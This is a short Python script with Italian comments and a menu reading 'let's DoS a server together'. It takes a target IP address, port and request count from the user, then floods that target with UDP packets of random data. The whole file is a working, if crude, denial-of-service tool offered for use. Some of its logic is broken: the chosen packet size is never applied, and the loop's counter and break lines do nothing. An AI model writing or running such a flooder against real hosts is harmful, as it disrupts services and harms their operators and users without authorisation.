import socket
import random
import string
def generate_random_string(length): #Funzione presa da google per generare stringhe random
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def calcolokb(n): # Funzione per stabilire il numero di kb da inviare 
 risultato = 1040 * n   # piccola conversione byte - kb
 return risultato

random_string = generate_random_string(1000)
print(random_string)






while (1):
    print("Dossiamo un server assieme:") # Menù di scelta
    print("")
    ip = str(input("Inserisci un indirizzo IP : "))    ##tipo stringa
    porta = int(input("Inserisci la porta: "))    ##tipo int per la porta
    kb = int(input("Inserisci i kb che vuoi inviare 1-10 "))  ##int 1-10
    richieste = int(input("Inserisci le richieste che vuoi inviare 30-100 "))  ##int 30-100
    kb = calcolokb(kb) ##Converto i kb
    print(kb)

    for x in range(richieste): #loop in base alle richieste dell'utente
     bytedainviare = random_string
     Messaggio = "Richiesta Numero : "
     print(Messaggio + str(x))
     su = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM) # Creazione di un socket udp (Datagram)
     su.sendto(bytedainviare.encode(), (str(ip),porta))  #Invio il pacchetto random all'indirizzo ip e porta
     x+1 ##Autoincrement
     if richieste == x:
        break ## Ritorno all'inizio dopo aver inviato i pacchetti
      
    







